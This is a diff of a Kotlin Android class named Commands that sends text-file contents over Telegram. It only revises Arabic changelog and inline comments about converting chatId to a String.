@@ -29,7 +29,8 @@ import kotlin.random.Random
  * - ✅ إصلاح خطأ Type mismatch في sendTelegramMessage: تغيير chatId إلى Any وتحويله إلى String داخلياً.
  * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString() لضمان التوافق.
  * - ✅ التأكد من أن جميع استدعاءات sendTelegramMessage في sendTextFile تستخدم chatId.toString().
- * - ✅ إصلاح السطر 1155 تحديداً: تم تحويل chatId إلى String باستخدام .toString() في جميع الاستدعاءات.
+ * - ✅ إصلاح السطر 1159 تحديداً: تم تحويل chatId إلى String باستخدام .toString() في جميع الاستدعاءات.
+ * - ✅ إضافة تحويل chatId إلى String في sendTelegramAction و sendTelegramMessage.
  */
 class Commands private constructor(context: Context) {
 
@@ -448,7 +449,7 @@ class Commands private constructor(context: Context) {
         replyToMessageId: Long = 0L
     ) {
         if (content.isBlank()) {
-            // ✅ السطر 1155: تم تحويل chatId إلى String باستخدام .toString()
+            // ✅ تحويل chatId إلى String
             sendTelegramMessage(
                 tg, chatId.toString(), "📄 $filename: لا يوجد محتوى",
                 receivingToken = receivingToken,
@@ -464,7 +465,7 @@ class Commands private constructor(context: Context) {
 
             if (tempFile.length() == 0L) {
                 safeRemove(tempFile)
-                // ✅ السطر 1155: تم تحويل chatId إلى String باستخدام .toString()
+                // ✅ تحويل chatId إلى String
                 sendTelegramMessage(
                     tg, chatId.toString(), "📄 $filename: ملف فارغ",
                     receivingToken = receivingToken,
@@ -483,7 +484,7 @@ class Commands private constructor(context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send text file error: ${e.message}")
-            // ✅ السطر 1155: تم تحويل chatId إلى String باستخدام .toString()
+            // ✅ تحويل chatId إلى String
             sendTelegramMessage(
                 tg, chatId.toString(), "📄 $filename:\n${content.take(4000)}",
                 receivingToken = receivingToken,
